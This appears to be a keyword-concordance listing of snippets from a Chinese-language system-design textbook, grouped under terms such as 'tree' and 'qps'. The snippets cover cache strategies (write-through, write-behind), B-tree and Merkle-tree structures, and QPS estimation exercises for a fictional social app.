  c07_b13.md: ...据类型。对每种，分析访问模式，估算合适 TTL，并选择缓存策略（cache-aside、write-through 或 write-behind）：  (a) 用户头像照片（照片 URL 存在 users 表中） (b) 用户的未读通知数（新事件发生...
  c07_b13.md: ...站“已创建帖子总数”计数器  提示  想想每种数据多久变化一次、多少用户访问它、旧数据如何影响用户体验。对计数器，想想 write-through 是否会造成数据库瓶颈。  **答案：**  **(a) 用户头像照片：**  访问模式：读密集型。用户...
  c07_b13.md: ...。用户期望计数近实时更新。旧数据后果：显示“3 条未读”而实际有 7 条，如果持续超过几秒会令人沮丧。  缓存策略：**Write-through 或直接 Redis 计数器**。因为这个数字变化频繁且准确性重要，短 TTL（10–30 秒）加 ca...
  c07_b13.md: ...数，用 `INCR`/`DECR` 操作（原子、亚毫秒）。Redis 成为该计数的事实来源，数据库作为备份。这本质上是 write-through：每个通知事件同时更新数据库和 Redis 计数器。  缓存 key：`user:{user_id}:u...
  c07_b13.md: ...新帖子把它从 1,000,000 变到 1,000,001——0.0001% 的变化，没有用户会注意。  缓存策略：**Write-behind 或 cache-aside 加长 TTL（10–60 分钟）**。这个计数本质上是近似的——没人需要实时...
  c07_b13.md: ...`SELECT COUNT(*) FROM posts`（大表上可能慢——可改用 Redis 中的物化计数器预计算）。Write-behind 模式在此完美：每次创建帖子递增 Redis 计数器，并定期把计数同步到数据库。用户始终看到 Redis...
  c07_b13.md: ...存什么。以下是他们在考虑的三种数据类型。对每种，分析访问模式，估算合适 TTL，并选择缓存策略（cache-aside、write-through 或 write-behind）：  (a) 用户头像照片（照片 URL 存在 users 表中） (b...
  c07_b13.md: ...据类型。对每种，分析访问模式，估算合适 TTL，并选择缓存策略（cache-aside、write-through 或 write-behind）：  (a) 用户头像照片（照片 URL 存在 users 表中） (b) 用户的未读通知数（新事件发生...
  c07_b13.md: ...站“已创建帖子总数”计数器  提示  想想每种数据多久变化一次、多少用户访问它、旧数据如何影响用户体验。对计数器，想想 write-through 是否会造成数据库瓶颈。  **答案：**  **(a) 用户头像照片：**  访问模式：读密集型。用户...
  c07_b13.md: ...。用户期望计数近实时更新。旧数据后果：显示“3 条未读”而实际有 7 条，如果持续超过几秒会令人沮丧。  缓存策略：**Write-through 或直接 Redis 计数器**。因为这个数字变化频繁且准确性重要，短 TTL（10–30 秒）加 ca...
  c07_b13.md: ...数，用 `INCR`/`DECR` 操作（原子、亚毫秒）。Redis 成为该计数的事实来源，数据库作为备份。这本质上是 write-through：每个通知事件同时更新数据库和 Redis 计数器。  缓存 key：`user:{user_id}:u...
  c07_b13.md: ...新帖子把它从 1,000,000 变到 1,000,001——0.0001% 的变化，没有用户会注意。  缓存策略：**Write-behind 或 cache-aside 加长 TTL（10–60 分钟）**。这个计数本质上是近似的——没人需要实时...
  c07_b13.md: ...`SELECT COUNT(*) FROM posts`（大表上可能慢——可改用 Redis 中的物化计数器预计算）。Write-behind 模式在此完美：每次创建帖子递增 Redis 计数器，并定期把计数同步到数据库。用户始终看到 Redis...
  c07_b17.md: ...常见模式：先查缓存，未命中时取数据库，填充缓存，返回。它是懒加载的（只缓存被请求的内容），并把失效责任交给应用。  **Write-through** 每次写入都保持缓存与数据库同步，消除陈旧但增加写入开销。**Write-behind** 批量写入...
  c07_b17.md: ...把失效责任交给应用。  **Write-through** 每次写入都保持缓存与数据库同步，消除陈旧但增加写入开销。**Write-behind** 批量写入，提升写性能但 risking 数据丢失。  **TTL** 是主要新鲜度旋钮。短 TTL...
  c10_b05.md: ...——如果你上传对象新版本并立即读取，可能拿到旧版本。现代对象存储（2020 年后的 S3）提供强 read-after-write 一致性，但对任何具体供应商都值得验证。  **扁平命名空间：** 没有目录，列出所有对象是完整扫描（按前缀过滤）。层级...
  c10_b10.md: ...→ 对象存储（多区复制、十一个 9） * 强事务保证 → 关系型数据库（ACID、WAL） * 为性能可接受丢失 → write-behind 缓存（设计上不持久）  **第 5 步：成本约束是什么？**  * 100 GB 热用户数据 → DRA...
  c10_b11.md: ...如 NFS）提供分层目录结构，客户端挂载后像本地磁盘一样使用。多个客户端可同时读写文件。文件操作——open、read、write、seek、append——在字节级别工作，文件系统维护元数据（权限、修改时间、目录结构）。  **对象存储**提供扁平...
  c28_b11.md: ...h 7) | 命中降低读；未命中走 DB | 最终（TTL 陈旧） | 高——缓存故障读仍存活 | 中——手动失效 **Write-through cache** (Ch 7) | 写延迟更高（同时写缓存和 DB） | 强——写后缓存始终最新 | 中...
  c28_b11.md: ...| 写延迟更高（同时写缓存和 DB） | 强——写后缓存始终最新 | 中——缓存或 DB 任一失败则写失败 | 中 **Write-behind cache** (Ch 7) | 写延迟更低（异步写 DB） | 最终——DB 可能落后缓存 | 缓存失...
  c28_b14.md: ...h 26) | 无延迟开销 | 最终（传播延迟） | 极高（无中央协调器 SPOF） | 低 **Fan-out on write** (Ch 22) | 读极低（预计算） | 最终（feed 新鲜前有扇出延迟） | 高（读始终可用） | 中–高（扇...

=== tree (56 occurrences) ===
  c05_b03.md: ...#### B-Tree 索引——快速查询的引擎  索引是数据库在表之外维护的独立数据结构，用于加速特定查询。  最常见的索引结构是 **B-t...
  c05_b03.md: ...e 索引——快速查询的引擎  索引是数据库在表之外维护的独立数据结构，用于加速特定查询。  最常见的索引结构是 **B-tree（平衡树）**。B-tree 把索引键值按排序存储，每个树节点指向一个行范围。在 100 百万（1 亿）行的 B-tre...
  c05_b03.md: ...索引是数据库在表之外维护的独立数据结构，用于加速特定查询。  最常见的索引结构是 **B-tree（平衡树）**。B-tree 把索引键值按排序存储，每个树节点指向一个行范围。在 100 百万（1 亿）行的 B-tree 中找一个键大约需要 lo...
  c05_b03.md: ...ree（平衡树）**。B-tree 把索引键值按排序存储，每个树节点指向一个行范围。在 100 百万（1 亿）行的 B-tree 中找一个键大约需要 log₂(100,000,000) ≈ 27 次比较——而不是 1 亿次。  把 B-tree 索...
  c05_b03.md: ...B-tree 中找一个键大约需要 log₂(100,000,000) ≈ 27 次比较——而不是 1 亿次。  把 B-tree 索引想象成书的索引。你不用读完整本书去找“sharding（分片）”的出现，直接在索引里查 “sharding”（O(...
  c05_b03.md: ...EATE INDEX idx_posts_user_id ON posts(user_id);  数据库会创建一个 B-tree，每个叶节点包含一个 `user_id` 值和指向对应行的指针。查询 `WHERE user_id = 1` 现在只需要...
  c05_b03.md: ...HERE user_id = 1` 现在只需要 O(log n) 时间，而不是 O(n)。  **索引的代价：** B-tree 占用额外磁盘空间（通常每个索引占表大小的 10–30%）。更重要的是，每次对表写入都必须更新所有相关索引。有 10 个...
  c05_b03.md: ...#### B-Tree 索引——快速查询的引擎  索引是数据库在表之外维护的独立数据结构，用于加速特定查询。  最常见的索引结构是 **B-t...
  c05_b03.md: ...e 索引——快速查询的引擎  索引是数据库在表之外维护的独立数据结构，用于加速特定查询。  最常见的索引结构是 **B-tree（平衡树）**。B-tree 把索引键值按排序存储，每个树节点指向一个行范围。在 100 百万（1 亿）行的 B-tre...
  c05_b03.md: ...索引是数据库在表之外维护的独立数据结构，用于加速特定查询。  最常见的索引结构是 **B-tree（平衡树）**。B-tree 把索引键值按排序存储，每个树节点指向一个行范围。在 100 百万（1 亿）行的 B-tree 中找一个键大约需要 lo...
  c05_b03.md: ...ree（平衡树）**。B-tree 把索引键值按排序存储，每个树节点指向一个行范围。在 100 百万（1 亿）行的 B-tree 中找一个键大约需要 log₂(100,000,000) ≈ 27 次比较——而不是 1 亿次。  把 B-tree 索...
  c05_b03.md: ...B-tree 中找一个键大约需要 log₂(100,000,000) ≈ 27 次比较——而不是 1 亿次。  把 B-tree 索引想象成书的索引。你不用读完整本书去找“sharding（分片）”的出现，直接在索引里查 “sharding”（O(...
  c05_b03.md: ...EATE INDEX idx_posts_user_id ON posts(user_id);  数据库会创建一个 B-tree，每个叶节点包含一个 `user_id` 值和指向对应行的指针。查询 `WHERE user_id = 1` 现在只需要...
  c05_b03.md: ...HERE user_id = 1` 现在只需要 O(log n) 时间，而不是 O(n)。  **索引的代价：** B-tree 占用额外磁盘空间（通常每个索引占表大小的 10–30%）。更重要的是，每次对表写入都必须更新所有相关索引。有 10 个...
  c05_b07.md: ...ACID 保证 | ↓ 单点故障 | ↑↑ WAL + ACID 持久性 | ↓ 成熟、工具完善 | | **添加 B-tree 索引** | ↓ 大幅降低读 | ↔ 写略降 | ↔ 无影响 | ↔ | ↔ | ↑ 必须谨慎选择 |   ### 5...
  c05_b12.md: ...posts(user_id, created_at DESC);  这个索引用一个结构服务查询的两部分。数据库找到 B-tree 中 `user_id = 42` 的部分（O(log n)），然后按 `created_at` 降序读取条目（索引里已...
  c05_b14.md: ...。它的力量来自 **SQL**——一种声明式查询语言，让你问关于数据的任何问题，而无需把查询与存储实现耦合。  **B-tree 索引**是 SQL 变快的机制：数据库不用扫描每一行，而是以 O(log n) 时间找到匹配行。索引设计是关系型数据库...
  c06_b04.md: ...写入而设计。其日志结构合并树（LSM-tree）存储引擎把写入接收到内存缓冲区，再批量刷到磁盘——比高容量写入下的 B-tree 更新快得多。  **地理分布、高可用读写：** Cassandra 使用对等架构，一致性可调。你可以配置它优先可用性（...
  c06_b07.md: ...| ↓ 分区内快 | ↑↑ 卓越的写吞吐 | ↓ 默认最终一致（可调） | ↑↑ 很高；对等，无单主 | ↑ LSM-tree 持久化 | ↑↑ 查询模型要求围绕访问模式预先设计 schema | | **图数据库（如 Neo4j）** | ↓...
  c10_b03.md: ...照备份（整个卷在一致时间点的副本）  PostgreSQL 把数据文件存在块存储上。当 PostgreSQL 写入 B-tree 索引更新（第 5 章）时，它是在向块设备写特定块。PostgreSQL 下面的 NVMe SSD 就是块存储。这就是为...
  c10_b06.md: ...rofile_photo BYTEA;   这对少量用户有效。大规模下多方面失败：  * PostgreSQL 的 B-tree 索引优化小值。在表中存 2 MB blob 会降低索引性能——页面巨大，缓冲池（RAM 缓存）被大 blob 填满，而...
  c10_b11.md: ...级随机读写——能够读写文件中特定块而不读整个文件。PostgreSQL WAL 写入会更新 WAL 文件的特定字节。B-tree 插入会修改索引文件中特定页面。这些都是小而随机的原地修改。...
  c14_b06.md: ...歧更新的后台修复过程。在 Cassandra 中，这通过 **repair** 进程完成，使用一种叫 **Merkle tree（默克尔树）** 的数据结构来高效识别副本之间哪些数据不同。  plain 语言：反熵就是系统定期检查副本是否有分歧并修...
  c26_b04.md: ...乎 100%，无论哪些具体节点宕机。  * * *   ### 26.4 Anti-Entropy——用 Merkle Tree 修复副本  故障和恢复后，副本可能分歧。节点 A 有 100 万键，离线 2 小时，期间收到邻居 hinted han...
  c26_b04.md: ...和 B 的每个键值对。每节点 10 亿键，需要传输和比较 10 亿条目——过于昂贵。   #### 定义：Merkle Tree  **Merkle tree**（哈希树）是一种二叉树，每个叶子包含一个数据块（如一个键范围）的哈希，每个内部节点包含...
  c26_b04.md: ...10 亿键，需要传输和比较 10 亿条目——过于昂贵。   #### 定义：Merkle Tree  **Merkle tree**（哈希树）是一种二叉树，每个叶子包含一个数据块（如一个键范围）的哈希，每个内部节点包含其子节点哈希的哈希。根哈希是代...
  c26_b04.md: ...，分歧在左半 keyspace。递归进入左子树直到到达存在分歧的叶子（具体键范围）。  plain 语言：Merkle tree 是数据集的指纹。比较两个副本的 Merkle tree 只需 O(log N) 次哈希比较即可定位分歧键范围，而非 O...
  c26_b04.md: ...在分歧的叶子（具体键范围）。  plain 语言：Merkle tree 是数据集的指纹。比较两个副本的 Merkle tree 只需 O(log N) 次哈希比较即可定位分歧键范围，而非 O(N) 次键比较。只有分歧键范围的数据需要传输修复。...
  c26_b04.md: ...输修复。  anti-entropy 过程在后台持续运行：  1. 每个节点维护其 keyspace 的 Merkle tree，随键变化增量更新 2. 节点定期与对等节点比较根哈希 3. 若根不同，树比较将分歧缩小到具体键范围 4. 只传输并合并...
  c26_b04.md: ...乎 100%，无论哪些具体节点宕机。  * * *   ### 26.4 Anti-Entropy——用 Merkle Tree 修复副本  故障和恢复后，副本可能分歧。节点 A 有 100 万键，离线 2 小时，期间收到邻居 hinted han...
  c26_b04.md: ...和 B 的每个键值对。每节点 10 亿键，需要传输和比较 10 亿条目——过于昂贵。   #### 定义：Merkle Tree  **Merkle tree**（哈希树）是一种二叉树，每个叶子包含一个数据块（如一个键范围）的哈希，每个内部节点包含...
  c26_b04.md: ...10 亿键，需要传输和比较 10 亿条目——过于昂贵。   #### 定义：Merkle Tree  **Merkle tree**（哈希树）是一种二叉树，每个叶子包含一个数据块（如一个键范围）的哈希，每个内部节点包含其子节点哈希的哈希。根哈希是代...
  c26_b04.md: ...，分歧在左半 keyspace。递归进入左子树直到到达存在分歧的叶子（具体键范围）。  plain 语言：Merkle tree 是数据集的指纹。比较两个副本的 Merkle tree 只需 O(log N) 次哈希比较即可定位分歧键范围，而非 O...
  c26_b04.md: ...在分歧的叶子（具体键范围）。  plain 语言：Merkle tree 是数据集的指纹。比较两个副本的 Merkle tree 只需 O(log N) 次哈希比较即可定位分歧键范围，而非 O(N) 次键比较。只有分歧键范围的数据需要传输修复。...
  c26_b04.md: ...输修复。  anti-entropy 过程在后台持续运行：  1. 每个节点维护其 keyspace 的 Merkle tree，随键变化增量更新 2. 节点定期与对等节点比较根哈希 3. 若根不同，树比较将分歧缩小到具体键范围 4. 只传输并合并...
  c26_b06.md: ...据使用不同 N/W/R 配置。正确的一致性级别始终是数据具体需求的函数——而非系统级设置。   #### Merkle Tree 与 SocialSnap 数据调和  SocialSnap 分布式键值存储用 Merkle tree 检测其三副本节点...
  c26_b06.md: ...# Merkle Tree 与 SocialSnap 数据调和  SocialSnap 分布式键值存储用 Merkle tree 检测其三副本节点之间的分歧。任何节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 peer 的 M...
  c26_b06.md: ...本节点之间的分歧。任何节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 peer 的 Merkle tree 根。  对 timeline 缓存：30 分钟节点中断后典型分歧约 10 万（100,000）条收到更新的 timel...
  c26_b06.md: ...e 缓存：30 分钟节点中断后典型分歧约 10 万（100,000）条收到更新的 timeline 条目。Merkle tree 比较在约 20 次哈希比较内（每节点 10 亿键的 log₂ = 30 层）将分歧定位到很小的 keyspace 范围...
  c26_b06.md: ...据使用不同 N/W/R 配置。正确的一致性级别始终是数据具体需求的函数——而非系统级设置。   #### Merkle Tree 与 SocialSnap 数据调和  SocialSnap 分布式键值存储用 Merkle tree 检测其三副本节点...
  c26_b06.md: ...# Merkle Tree 与 SocialSnap 数据调和  SocialSnap 分布式键值存储用 Merkle tree 检测其三副本节点之间的分歧。任何节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 peer 的 M...
  c26_b06.md: ...本节点之间的分歧。任何节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 peer 的 Merkle tree 根。  对 timeline 缓存：30 分钟节点中断后典型分歧约 10 万（100,000）条收到更新的 timel...
  c26_b06.md: ...e 缓存：30 分钟节点中断后典型分歧约 10 万（100,000）条收到更新的 timeline 条目。Merkle tree 比较在约 20 次哈希比较内（每节点 10 亿键的 log₂ = 30 层）将分歧定位到很小的 keyspace 范围...
  c26_b07.md: ...oppy quorum 与 hinted handoff：** 解决节点故障期间的写可用性问题 3. **Merkle tree anti-entropy：** 高效解决副本分歧检测问题 4. **基于 gossip 的成员管理：** 无中央协调器...
  c26_b08.md: ...不一致窗口从 A 恢复持续到 hinted handoff 完成——通常数秒到数分钟。  **Q4.** Merkle tree 如何实现高效的副本比较？为什么比比较所有键值对更高效？...
  c26_b09.md: ...**答案：** Merkle tree 是二叉树，叶子包含数据块（键范围）的哈希，内部节点包含子节点哈希的哈希。两个副本先比较根哈希：若相等，副本相同——完成...
  c26_b09.md: ...个键（或至少 N 个哈希值）。10 亿（1 billion）键就是 10 亿（1 billion）次比较。Merkle tree 最多需要 2 × log₂(N) 次哈希比较定位分歧——10 亿键约 60 次。实际传输的修复数据只是分歧子集。对典型...
  c26_b11.md: ...0 billion）键分布在 100 节点（每节点 1 亿（100 million）键）。每个节点维护的 Merkle tree 叶子覆盖 1 万（10,000）键范围。某节点故障后从 1 小时中断恢复，估计该 key range 期间有约 50...
  c26_b11.md: ...中断恢复，估计该 key range 期间有约 50 万（500,000）键被写入。估算定位分歧范围所需 Merkle tree 比较次数、分歧叶子节点数、修复总数据传输量（假设每个值平均 1KB）。  提示  Merkle tree 高度决定比较...
  c26_b11.md: ...Merkle tree 比较次数、分歧叶子节点数、修复总数据传输量（假设每个值平均 1KB）。  提示  Merkle tree 高度决定比较次数。分歧叶子数取决于 50 万分歧键如何分布在键范围中。  **答案：** Merkle tree 结构...
  c26_b11.md: ...le tree 高度决定比较次数。分歧叶子数取决于 50 万分歧键如何分布在键范围中。  **答案：** Merkle tree 结构：每节点 1 亿（100 million）键，叶子覆盖 1 万（10,000）键范围 → 100M / 10,00...
  c26_b11.md: ...50 个分歧键，因此基本所有 1 万片叶子都分歧（因为叶中任一键写入就会使该叶分歧）。这种广泛分歧场景下，Merkle tree 比较很快发现根分歧、两个子节点都分歧，迅速收敛到“全部分歧”。树比较在 14 次比较（一条路径）内终止，确定几乎所有数...
  c26_b11.md: ...1KB = 500 MB。远小于传输全部 1 亿键 × 1KB = 100 GB。即使在大范围分歧情况下，Merkle tree 也通过精确定位哪些键分歧，将传输数据减少 200 倍。...
  c26_b13.md: ...doff** 优先写可用性：写总是成功到 W 个可用节点，hinted 数据在标准节点恢复后转发。  **Merkle tree** 使副本修复高效：O(log N) 次比较定位分歧，只传输分歧键范围。  **Gossip 协议** 无需中央协调器...
  c28_b11.md: ...greSQL)** (Ch 5) | 中——ACID 写开销 | 强（ACID） | 中——单主是瓶颈 | 中 **B-tree indexes** (Ch 5) | 降低读延迟；提高写延迟 | N/A | N/A | 低——自动维护 **Docu...
  c28_b14.md: ...26) | 低（写到任意 W 节点） | 最终（标准节点可能未最新） | 极高（写总是成功） | 中 **Merkle tree anti-entropy** (Ch 26) | 无查询延迟影响 | 最终（后台修复） | 高（自愈合副本） | 中...

=== qps (53 occurrences) ===
  c03_b02.md: ...的答案通常仍能揭示正确的架构决策。一个差 1000 倍的答案通常意味着你漏掉了一个基本假设。   ### 3.3 估算 QPS——每秒多少请求？  任何系统设计你需要的第一个数字都是请求率。我们用例子来培养这个技能。  **问题：** 估算一个类...
  c03_b02.md: ...设计你需要的第一个数字都是请求率。我们用例子来培养这个技能。  **问题：** 估算一个类似 Twitter 的服务的 QPS，月活跃用户（MAU）为 300 百万（3 亿）。  **方法：** 拆成几步。我们知道或可以估算的：  * **月活跃...
  c03_b02.md: ...≈ 86,000 请求/秒  但流量不均匀。峰值时段可能是平均的 2–3 倍。假设峰值是平均的 3 倍：  * 峰值 QPS ≈ 86,000 × 3 ≈ 260,000 QPS  **答案：** 设计目标约为 250,000–300,000...
  c03_b02.md: ...可能是平均的 2–3 倍。假设峰值是平均的 3 倍：  * 峰值 QPS ≈ 86,000 × 3 ≈ 260,000 QPS  **答案：** 设计目标约为 250,000–300,000 峰值 QPS。  这立刻告诉你很多：  * 单台服务器...
  c03_b02.md: ...86,000 × 3 ≈ 260,000 QPS  **答案：** 设计目标约为 250,000–300,000 峰值 QPS。  这立刻告诉你很多：  * 单台服务器（通常可处理 10,000–100,000 RPS，视复杂度而定）不够。 *...
  c03_b02.md: ...定）不够。 * 你需要应用服务器集群。 * 数据库需要分片或大量缓存——没有单台数据库能处理 250,000 写密集的 QPS。  我们得到的数字精确吗？几乎肯定不。但我们学到了需要学的：这是一个需要分布式架构的高规模系统。这个结论对我们假设中的...
  c03_b03.md: ...小时 500 次，或每分钟约 8 次——即使对重度用户来说也高得异常。合理性检查会把它标红。   #### 常见误解  QPS 估算中一个常见错误是从注册用户数而不是日活用户数开始。一个有 100 百万（1 亿）注册账户、但每天只有 500 万打...
  c03_b03.md: ...500 万用户系统的负载——而不是 1 亿用户系统的负载。注册用户数出现在新闻稿里；日活用户数出现在架构文档里。估算 QPS 前总要先换算成 DAU，因为沉睡用户产生零请求。同样，工程师有时会估算“平均”QPS 并按这个数设计，却忘了峰值负载（...
  c03_b03.md: ...日活用户数出现在架构文档里。估算 QPS 前总要先换算成 DAU，因为沉睡用户产生零请求。同样，工程师有时会估算“平均”QPS 并按这个数设计，却忘了峰值负载（系统必须承受的流量尖峰）通常是平均的 2–3 倍。为平均负载设计的系统会在可预见的峰值...
  c03_b04.md: ...宽常常是最令人惊讶的约束。我们来估算 SocialSnap 的带宽。  **读带宽（向用户输送内容）：**  * 峰值 QPS：假设 50,000（中小型 SocialSnap） * 平均响应大小：约 50 KB（含文字和缩略图的 Feed 页）...
  c03_b05.md: ...* 主页：约 50 KB * 发帖：200 字节文字 + 0% 图片（暂时简化） * 点赞：100 字节元数据  **QPS 计算：**  | 行为 | 每日次数 | 每秒（平均） | |---|---|---| | Feed 加载 | 300...
  c03_b05.md: ...平均） | |---|---|---| | Feed 加载 | 300K × 5 = 1.5M（150 万） | 17 QPS | | 主页查看 | 300K × 3 = 900K（90 万） | 10 QPS | | 发帖 | 300K / 3...
  c03_b05.md: ...1.5M（150 万） | 17 QPS | | 主页查看 | 300K × 3 = 900K（90 万） | 10 QPS | | 发帖 | 300K / 3 = 100K（10 万） | 1.2 QPS | | 点赞 | 300K × 10...
  c03_b05.md: ...= 900K（90 万） | 10 QPS | | 发帖 | 300K / 3 = 100K（10 万） | 1.2 QPS | | 点赞 | 300K × 10 = 3M（300 万） | 35 QPS | | **总计** | **约 5....
  c03_b05.md: ...= 100K（10 万） | 1.2 QPS | | 点赞 | 300K × 10 = 3M（300 万） | 35 QPS | | **总计** | **约 5.5M（550 万）/天** | **约 63 QPS 平均** |  峰值（平均...
  c03_b05.md: ...M（300 万） | 35 QPS | | **总计** | **约 5.5M（550 万）/天** | **约 63 QPS 平均** |  峰值（平均 3 倍）：约 190 QPS  **带宽：**  * Feed 加载：17 QPS × 2...
  c03_b05.md: ...| **约 5.5M（550 万）/天** | **约 63 QPS 平均** |  峰值（平均 3 倍）：约 190 QPS  **带宽：**  * Feed 加载：17 QPS × 200 KB = 3.4 MB/s 读 * 主页查看：10...
  c03_b05.md: ...63 QPS 平均** |  峰值（平均 3 倍）：约 190 QPS  **带宽：**  * Feed 加载：17 QPS × 200 KB = 3.4 MB/s 读 * 主页查看：10 QPS × 50 KB = 500 KB/s 读 *...
  c03_b05.md: ...**带宽：**  * Feed 加载：17 QPS × 200 KB = 3.4 MB/s 读 * 主页查看：10 QPS × 50 KB = 500 KB/s 读 * **总峰值读带宽：约 12 MB/s**（非常 modest）  **存...
  c03_b05.md: ...非常 modest。一台配置合理的服务器（比如 32 核、128 GB RAM、2 TB SSD）就能舒适处理——峰值 QPS 只有 190，带宽 12 MB/s，存储增长缓慢。有趣的架构决策从 1000 万用户开始。  这是个有用的结果。它告诉...
  c03_b06.md: ...载。关键缺失信息：  * 这是注册用户（很多可能不活跃）还是日活用户？ * 每个用户做什么？每人每月 1 次请求是 4 QPS，每天 100 次请求是 11,500 QPS。两者需要完全不同的架构。 * 读/写比例是多少？读密集型系统可以激进使用...
  c03_b06.md: ...能不活跃）还是日活用户？ * 每个用户做什么？每人每月 1 次请求是 4 QPS，每天 100 次请求是 11,500 QPS。两者需要完全不同的架构。 * 读/写比例是多少？读密集型系统可以激进使用缓存；写密集型不能。 * 访问模式是均匀还是突...
  c03_b06.md: ...am–5 pm）登录，与全球用户分布的负载画像完全不同。 * 每个用户的数据量是多少？  对架构有用的数字是：**峰值 QPS、读/写比例、平均响应大小、总存储大小、存储增长率。** “用户”是营销指标，不是工程指标。做架构决策前，总要把它转换成...
  c03_b07.md: ...#### 应用问题  **Q1.** 你正在设计一个 URL 短链接服务（完整设计在第 20 章）。估算一个服务的 QPS、存储和带宽需求：该服务每天处理 1 亿次短链接创建、100 亿次重定向。  提示  把两个操作分开：写（新短 URL...
  c03_b07.md: ...读（重定向）。读/写比例会揭示很多架构信息。存储方面，想想每个短 URL 需要存哪些数据。  **答案：**  **写 QPS（新 URL 创建）：** 1 亿 / 86,400 秒 ≈ **每秒 1160 次写**（峰值：约 3500 次/秒）...
  c03_b07.md: ...创建）：** 1 亿 / 86,400 秒 ≈ **每秒 1160 次写**（峰值：约 3500 次/秒）  **读 QPS（重定向）：** 100 亿 / 86,400 秒 ≈ **每秒 115,700 次读**（峰值：约 350,000 次...
  c03_b07.md: ...SocialSnap 大致有：  * Feed 加载：5M × 5/天 = 25M/天（2500 万/天）= 289 QPS 平均 → 870 QPS 峰值  如果 20% 的 Feed 加载包含一个自动播放视频，码率（比如）2 Mbps：...
  c03_b07.md: ...致有：  * Feed 加载：5M × 5/天 = 25M/天（2500 万/天）= 289 QPS 平均 → 870 QPS 峰值  如果 20% 的 Feed 加载包含一个自动播放视频，码率（比如）2 Mbps：...
  c03_b08.md: ...* 870 QPS × 20% = 174 个并发视频流 * 视频带宽：174 × 2 Mbps = **348 Mbps ≈ 0.35...
  c03_b08.md: ...DAU 每天上传一首新的 4 分钟曲目，编码为 320 kbps。  估算：  * **(a)** 音频流式请求的平均 QPS（假设每个“请求”启动一次 45 分钟流） * **(b)** 新上传曲目每天需要的存储  展示所有单位换算。  **答...
  c03_b08.md: ...流） * **(b)** 新上传曲目每天需要的存储  展示所有单位换算。  **答案：**  **(a) 流式请求平均 QPS：**  5000 万 DAU 每人每天启动一次流式会话（简化假设——现实中用户可能多次启停）。  每天流式会话数 =...
  c03_b08.md: ...次启停）。  每天流式会话数 = 50,000,000 每天秒数 = 24 × 60 × 60 = 86,400 平均 QPS = 50,000,000 / 86,400 ≈ **579 请求/秒**  峰值 QPS（假设晚间为平均 3 倍）：≈...
  c03_b08.md: ...60 = 86,400 平均 QPS = 50,000,000 / 86,400 ≈ **579 请求/秒**  峰值 QPS（假设晚间为平均 3 倍）：≈ **1,740 QPS**  注意：这仅统计流启动请求。实际音频数据以连续字节流传输——...
  c03_b08.md: ...,000 / 86,400 ≈ **579 请求/秒**  峰值 QPS（假设晚间为平均 3 倍）：≈ **1,740 QPS**  注意：这仅统计流启动请求。实际音频数据以连续字节流传输——带宽负载（见 b 部分逻辑）远大于请求数所暗示的。...
  c03_b09.md: ...倍会导致错误决策吗？  **讨论：** 考虑一个决策阈值正好落在你的估算边界上的系统。例如：你估算一个服务 8,000 QPS，而你知道单台数据库最多处理 10,000 QPS。你的估算说“一台数据库也许刚好能行——试试”。但如果真实数字是 80...
  c03_b09.md: ...策阈值正好落在你的估算边界上的系统。例如：你估算一个服务 8,000 QPS，而你知道单台数据库最多处理 10,000 QPS。你的估算说“一台数据库也许刚好能行——试试”。但如果真实数字是 80,000 QPS（差 10 倍），单台数据库会灾难...
  c03_b09.md: ...单台数据库最多处理 10,000 QPS。你的估算说“一台数据库也许刚好能行——试试”。但如果真实数字是 80,000 QPS（差 10 倍），单台数据库会灾难性失败。  这个场景说明，10 倍精度对远离边界（你估 8,000 QPS，数据库阈值...
  c03_b09.md: ...0,000 QPS（差 10 倍），单台数据库会灾难性失败。  这个场景说明，10 倍精度对远离边界（你估 8,000 QPS，数据库阈值 100,000——即使差 10 倍仍在安全区）的决策足够，但对接近阈值（8,000 vs 10,000）的...
  c03_b09.md: ...含义：永远留出余量。不要按估算容量的 100% 设计——要按最大容量的 20–30% 设计。如果你的估算是 8,000 QPS，就设计一个能舒适处理 30,000–40,000 QPS 的系统。那么 10 倍估算误差只是意味着余量比预期少一点，而...
  c03_b09.md: ...按最大容量的 20–30% 设计。如果你的估算是 8,000 QPS，就设计一个能舒适处理 30,000–40,000 QPS 的系统。那么 10 倍估算误差只是意味着余量比预期少一点，而不是立即失败。好的系统设计为估算误差保留 headroom...
  c03_b10.md: ...s）的数量级。这些是你这个世界的速度极限。 * **2 和 10 的幂：** 你用来度量存储和吞吐的计数系统。 * **QPS 估算：** 从用户 → DAU → 每用户每天动作数 → 每秒请求数 → 峰值乘数。 * **存储估算：** 从每用户...
  c03_b10.md: ...峰值乘数。 * **存储估算：** 从每用户数据量 → 用户数 → 时间跨度 → 开销乘数。 * **带宽估算：** QPS × 平均响应大小 → 峰值乘数。 * **费米估算：** 把未知拆成可估算的部分，相乘，再用直觉做合理性检查。  我们...
  c03_b10.md: ...度，同样重要的是，什么时候不该加。  **SocialSnap 100 万用户估算** 建立了我们的基线：峰值 190 QPS、读带宽 12 MB/s、5 年存储 600 GB。随着 SocialSnap 增长，这些数字会剧烈变化——而这些变化将...
  c07_b15.md: ...求从数据库重建。2 分钟 TTL 下，过期事件之间 90%+ 的 Feed 读会命中缓存。估算数据库负载：峰值 200 QPS × 10% 未命中率 = 峰值 20 个 Feed 查询/秒——在 PostgreSQL 能力范围内。  _第二层（T...
  c07_b15.md: ...30 次），但每天只加载 8 次（平均每小时 0.33 次）。在重建之间，多次 Feed 加载命中缓存。在 46 平均 QPS、2 分钟缓存生命周期下，一次数据库查询服务约 46 × 120 秒 ÷ 500,000 用户 × 用户 8 次加载……...
  c21_b14.md: ...息、每收到一条消息收到一次推送通知（平均每天收到 6 条）。估算 (a) 数据库消息写入和 (b) 推送通知投递的平均 QPS 与峰值 QPS。然后指出哪个组件（数据库写路径、推送通知服务或 WebSocket 连接服务器）最可能成为首个扩展瓶颈...
  c21_b14.md: ...息收到一次推送通知（平均每天收到 6 条）。估算 (a) 数据库消息写入和 (b) 推送通知投递的平均 QPS 与峰值 QPS。然后指出哪个组件（数据库写路径、推送通知服务或 WebSocket 连接服务器）最可能成为首个扩展瓶颈。  提示  应...
  c21_b14.md: ...**(a) 消息写入：**  500,000 DAU × 8 条消息/天 = 4,000,000 次写入/天  平均 QPS = 4,000,000 / 86,400 ≈ **46 次写入/秒**  峰值 QPS（按平均 3 倍）≈ **140...
